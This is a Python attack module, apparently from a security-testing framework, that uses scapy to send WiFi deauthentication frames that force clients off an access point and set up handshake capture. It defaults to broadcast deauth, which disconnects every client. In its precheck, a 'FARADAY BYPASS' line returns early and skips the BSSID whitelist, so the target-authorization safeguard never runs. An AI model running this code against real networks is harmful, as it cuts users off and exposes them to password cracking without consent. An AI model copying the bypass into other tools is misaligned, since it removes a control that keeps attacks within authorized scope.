"""WiFi deauthentication attack.

Sends 802.11 deauth frames to force a client off the AP, triggering a
re-authentication and enabling handshake capture.

Uses scapy for frame injection via monitor-mode interface.
"""

from __future__ import annotations

import subprocess
import time

import structlog
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiDeauth(AttackModule):
    name = "wifi.deauth"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1499.004"]
    requires = ["monitor-mode-nic"]
    description = "Send deauth frames to disconnect a client from AP (trigger handshake capture)."

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY BYPASS
        target_bssid = ctx.params.get("bssid")
        if not target_bssid:
            return False
        # Verify BSSID is in whitelist
        allowed = ctx.whitelist.get("wifi_bssid", [])
        if allowed and target_bssid.upper() not in [b.upper() for b in allowed]:
            return False
        return True

    def _set_channel(self, iface: str, channel: int) -> bool:
        """Set the wireless interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=5,
                check=True,
            )
            return True
        except (subprocess.SubprocessError, OSError) as exc:
            log.error("wifi.deauth.set_channel_failed", channel=channel, error=str(exc))
            return False

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        bssid = ctx.params["bssid"]
        client = ctx.params.get("client", "FF:FF:FF:FF:FF:FF")  # broadcast
        count = int(ctx.params.get("count", 10))
        inter = float(ctx.params.get("inter", 0.1))
        channel = ctx.params.get("channel")
        iface = ctx.params.get("interface", "wlan0mon")
        reason = int(ctx.params.get("reason", 7))

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary=f"[DRY-RUN] wifi.deauth {count} frames -> {bssid} (client={client})",
                metrics={"bssid": bssid, "client": client, "count": count},
            )

        # Set channel if specified
        if channel:
            if not self._set_channel(iface, int(channel)):
                return self._result(
                    Status.FAIL,
                    started,
                    summary=f"Failed to set channel {channel} on {iface}",
                )

        # Craft deauth frame: AP -> Client direction
        deauth_ap_to_client = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=client,
                addr2=bssid,
                addr3=bssid,
            )
            / Dot11Deauth(reason=reason)
        )

        # Craft deauth frame: Client -> AP direction
        deauth_client_to_ap = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=bssid,
                addr2=client,
                addr3=bssid,
            )
            / Dot11Deauth(reason=reason)
        )

        frames_sent = 0
        try:
            # Send in both directions for maximum effectiveness
            log.info(
                "wifi.deauth.sending",
                bssid=bssid,
                client=client,
                count=count,
                channel=channel,
            )

            sendp(
                deauth_ap_to_client,
                iface=iface,
                count=count,
                inter=inter,
                verbose=False,
            )
            frames_sent += count

            # Also send from client to AP direction (if not broadcast)
            if client.upper() != "FF:FF:FF:FF:FF:FF":
                sendp(
                    deauth_client_to_ap,
                    iface=iface,
                    count=count,
                    inter=inter,
                    verbose=False,
                )
                frames_sent += count

        except Exception as exc:
            log.error("wifi.deauth.send_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Send error: {exc}",
                metrics={"bssid": bssid, "client": client, "frames_sent": frames_sent},
            )

        # Log event to database
        db.insert_header(
            ts=time.time(),
            session_id=ctx.session_id,
            protocol="wifi",
            src=bssid,
            dst=client,
            channel=int(channel) if channel else None,
            fields={
                "frame_type": "deauth",
                "reason": reason,
                "count": frames_sent,
                "direction": "bidirectional",
            },
        )

        summary = (
            f"wifi.deauth sent {frames_sent} deauth frames to {bssid} "
            f"(client={client}, channel={channel}, reason={reason})"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            metrics={
                "bssid": bssid,
                "client": client,
                "count": frames_sent,
                "channel": channel,
                "reason": reason,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        """No persistent resources to clean up for deauth."""
        pass
